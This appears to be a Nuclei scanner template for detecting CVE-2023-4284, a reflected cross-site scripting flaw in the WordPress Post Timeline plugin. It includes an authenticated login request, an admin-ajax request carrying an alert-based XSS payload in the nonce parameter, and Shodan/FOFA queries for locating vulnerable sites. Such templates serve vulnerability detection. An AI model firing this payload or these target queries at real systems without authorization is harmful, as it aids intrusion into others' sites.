flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - post-timeline
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
- matchers:
  - part: body
    type: word
    words:
    - <img src onerror=alert(document.domain)
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/admin-ajax.php?action=ptl_ajax_handler&asl-nounce=%3Cimg%20src%20onerror%3Dalert%28document.domain%29%3E
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-4284
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:agilelogix:post_timeline:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-4284
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
    cvss-score: 7.1
    cwe-id: CWE-79
    epss-percentile: 0.91739
    epss-score: 0.07924
  description: 'The Post Timeline WordPress plugin before version 2.2.6 contains a
    reflected cross-site scripting vulnerability. The plugin does not properly sanitize
    and escape an invalid nonce before outputting it back in an AJAX response, which
    could allow attackers to execute arbitrary JavaScript code in an administrator''s
    browser context.

    '
  impact: 'Authenticated attackers can inject malicious JavaScript through an invalid
    nonce parameter in AJAX responses to execute code in administrator browsers and
    potentially hijack WordPress sites.

    '
  metadata:
    fofa-query: body="wp-content/plugins/post-timeline/"
    max-request: 2
    product: post-timeline
    shodan-query: http.html:"wp-content/plugins/post-timeline/"
    vendor: agilelogix
  name: WordPress Post Timeline Plugin < 2.2.6 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/1c126869-0afa-456f-94cc-10334964e5f9
  - https://nvd.nist.gov/vuln/detail/CVE-2023-4284
  remediation: 'Update Post Timeline plugin to version 2.2.6 or later that properly
    sanitizes and escapes the nonce parameter in AJAX responses.

    '
  severity: high
  tags: cve,cve2023,wordpress,wp,wp-plugin,xss,post-timeline,authenticated,vuln
